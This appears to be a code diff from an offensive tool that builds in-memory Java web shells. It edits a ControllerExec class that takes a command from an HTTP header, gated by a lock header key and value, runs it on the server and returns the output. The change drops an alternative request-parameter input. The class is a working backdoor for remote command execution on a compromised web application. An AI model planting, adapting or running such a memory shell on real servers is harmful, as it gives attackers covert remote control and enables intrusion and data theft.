@@ -16,10 +16,9 @@ import java.lang.reflect.Method;
  */
 @MemShell(MemShell.Controller)
 @MemShellFunction(MemShellFunction.Exec)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ControllerExec {
     private static String HEADER;
-    private static String PARAM;
     private static String lockHeaderKey;
     private static String lockHeaderValue;
 
@@ -39,17 +38,7 @@ public class ControllerExec {
             }
 
             Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            Object parameter = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
-
-
-            String str = null;
-            if (header != null) {
-                str = (String) header;
-            } else if (parameter != null) {
-                str = (String) parameter;
-            }
-
-            String result = exec(str);
+            String result = exec((String) header);
             invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
             Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
             invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
